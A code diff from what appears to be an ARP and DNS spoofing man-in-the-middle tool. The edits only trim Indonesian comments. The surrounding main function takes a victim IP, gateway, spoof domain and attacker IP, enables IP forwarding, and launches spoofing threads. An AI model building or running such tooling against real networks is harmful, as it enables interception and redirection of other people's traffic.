@@ -29,11 +29,11 @@ def main():
     show_banner()
     parser = argparse.ArgumentParser(description="MITM Tactical Suite - ARP & DNS Spoofing")
     
-    # Argumen Wajib (ARP)
+    # Wajib (ARP)
     parser.add_argument("-t", "--target", dest="target", required=True, help="Victim IP Address")
     parser.add_argument("-g", "--gateway", dest="gateway", required=True, help="Gateway IP Address")
     
-    # Argumen Opsional (DNS)
+    # Opsional (DNS)
     parser.add_argument("-d", "--domain", dest="domain", help="Target Domain for DNS Spoofing (e.g., target.com)")
     parser.add_argument("-r", "--rogue", dest="rogue_ip", help="Rogue IP for DNS Spoofing (Attacker IP)")
 
@@ -41,13 +41,13 @@ def main():
 
     toggle_ip_forwarding(enable=True)
     
-    # 1. Jalankan Thread ARP (Wajib)
+    # Thread ARP 
     arp_spoofer = ARPSpoofer(options.target, options.gateway)
     arp_thread = threading.Thread(target=arp_spoofer.run)
     arp_thread.daemon = True
     arp_thread.start()
 
-    # 2. Jalankan Thread DNS (Jika argumen diisi)
+    # Thread DNS 
     if options.domain and options.rogue_ip:
         dns_spoofer = DNSSpoofer(options.domain, options.rogue_ip)
         dns_thread = threading.Thread(target=dns_spoofer.run)
